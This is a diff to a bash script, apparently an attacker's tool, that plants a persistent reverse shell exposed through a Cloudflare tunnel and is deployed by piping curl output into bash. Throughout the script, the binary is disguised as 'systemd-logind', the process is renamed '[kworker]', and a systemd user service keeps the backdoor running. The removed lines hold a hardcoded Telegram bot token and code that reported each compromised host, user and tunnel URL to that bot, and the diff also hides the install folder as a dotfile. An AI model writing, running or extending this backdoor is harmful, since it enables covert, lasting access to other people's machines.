@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Cloudflare Tunnel Reverse Shell Persistence + Telegram
+# Cloudflare Tunnel Reverse Shell Persistence (like gsocket)
 # Usage: bash -c "$(curl -fsSL https://domain/path/deploy.sh)"
 # Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://domain/path/deploy.sh)"
 
@@ -7,10 +7,6 @@
 : "${HOME:=/tmp}"
 : "${USER:=$(whoami 2>/dev/null || echo unknown)}"
 : "${UID:=$(id -u 2>/dev/null || echo 0)}"
-
-# Telegram Bot (hardcode)
-GS_TG_TOKEN="8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
-GS_TG_CHATID="6223261018"
 
 BIN_HIDDEN_NAME="systemd-logind"
 PROC_HIDDEN_NAME="[kworker]"
@@ -85,19 +81,7 @@ start_bindshell() {
     echo $!
 }
 
-# ========== KIRIM TELEGRAM ==========
-send_telegram() {
-    local url="$1"
-    local msg="✅ New reverse shell: ${url}%0AHost: $(hostname)%0AUser: ${USER}%0APort: ${PORT}"
-    if command -v curl >/dev/null; then
-        curl -s -X POST "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage" \
-            -d "chat_id=${GS_TG_CHATID}&text=${msg}" >/dev/null 2>&1 || true
-    elif command -v wget >/dev/null; then
-        wget -q -O- "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&text=${msg}" >/dev/null 2>&1 || true
-    fi
-}
-
-# ========== START TUNNEL (Tersembunyi + Kirim Telegram) ==========
+# ========== START TUNNEL (Tersembunyi) ==========
 start_tunnel() {
     local port="$1"
     local bin="$2"
@@ -108,52 +92,23 @@ start_tunnel() {
             echo "$url" > "$url_file"
             echo -e "\n\033[1;32m✅ TUNNEL URL: $url\033[0m" >&2
             echo -e "Connect with:\n  cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444\n" >&2
-            send_telegram "$url"
         fi
         echo "$line" >> "$TMPDIR/cloudflared.log"
     done &
     echo $!
 }
 
-# ========== PERSISTENCE (dengan Telegram) ==========
+# ========== PERSISTENCE ==========
 install_persistence() {
     local bin_path="$1"
     local port="$2"
-    local script_path="${HOME}/${CONFIG_DIR}/cf_tunnel.sh"
+    local script_path="${HOME}/.${CONFIG_DIR}/cf_tunnel.sh"
     local service_name="cf-tunnel"
-    mkdir -p "${HOME}/${CONFIG_DIR}"
+    mkdir -p "${HOME}/.${CONFIG_DIR}"
     cat > "$script_path" <<EOF
 #!/bin/bash
-# Persistence script for Cloudflare Tunnel (hidden as ${PROC_HIDDEN_NAME})
-export GS_TG_TOKEN="${GS_TG_TOKEN}"
-export GS_TG_CHATID="${GS_TG_CHATID}"
-TMPDIR="/tmp/.cf-${UID}"
-PORT=${port}
-BIN_PATH="${bin_path}"
-PROC_HIDDEN_NAME="${PROC_HIDDEN_NAME}"
-
-send_telegram() {
-    local url="\$1"
-    local msg="✅ Reverse shell restarted: \${url}%0AHost: \$(hostname)%0AUser: \${USER}%0APort: \${PORT}"
-    if command -v curl >/dev/null; then
-        curl -s -X POST "https://api.telegram.org/bot\${GS_TG_TOKEN}/sendMessage" \
-            -d "chat_id=\${GS_TG_CHATID}&text=\${msg}" >/dev/null 2>&1
-    elif command -v wget >/dev/null; then
-        wget -q -O- "https://api.telegram.org/bot\${GS_TG_TOKEN}/sendMessage?chat_id=\${GS_TG_CHATID}&text=\${msg}" >/dev/null 2>&1
-    fi
-}
-
 while true; do
-    # Jalankan tunnel dengan hidden name dan capture URL
-    ( exec -a "\$PROC_HIDDEN_NAME" "\$BIN_PATH" tunnel --url "tcp://localhost:\$PORT" ) 2>&1 | while IFS= read -r line; do
-        if [[ "\$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
-            url="\${BASH_REMATCH[0]}"
-            echo "\$url" > "\$TMPDIR/tunnel.url"
-            echo "\$(date) - Tunnel URL: \$url" >> "\$TMPDIR/cloudflared.log"
-            send_telegram "\$url"
-        fi
-        echo "\$line" >> "\$TMPDIR/cloudflared.log"
-    done
+    exec -a "$PROC_HIDDEN_NAME" "$bin_path" tunnel --url "tcp://localhost:${port}" 2>&1 | tee -a "$TMPDIR/cloudflared.log"
     sleep 10
 done
 EOF
@@ -199,7 +154,7 @@ uninstall() {
         systemctl --user disable cf-tunnel.service 2>/dev/null || true
         rm -f "${HOME}/.config/systemd/user/cf-tunnel.service"
     fi
-    rm -rf "${HOME}/${CONFIG_DIR}"
+    rm -rf "${HOME}/.${CONFIG_DIR}"
     rm -rf "$TMPDIR"
     info "Uninstall complete."
     exit 0
@@ -214,14 +169,8 @@ mkdir -p "$TMPDIR"
 arch=$(detect_arch)
 cf_bin=$(download_cloudflared "$arch")
 
-INSTALL_DIR="${HOME}/${CONFIG_DIR}"
+INSTALL_DIR="${HOME}/.${CONFIG_DIR}"
 mkdir -p "$INSTALL_DIR"
-
-# Hentikan proses lama agar binary bisa ditimpa
-pkill -f "$BIN_HIDDEN_NAME" 2>/dev/null || true
-pkill -f "$PROC_HIDDEN_NAME" 2>/dev/null || true
-sleep 1
-
 cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME"
 chmod 755 "$INSTALL_DIR/$BIN_HIDDEN_NAME"
 cf_bin="$INSTALL_DIR/$BIN_HIDDEN_NAME"
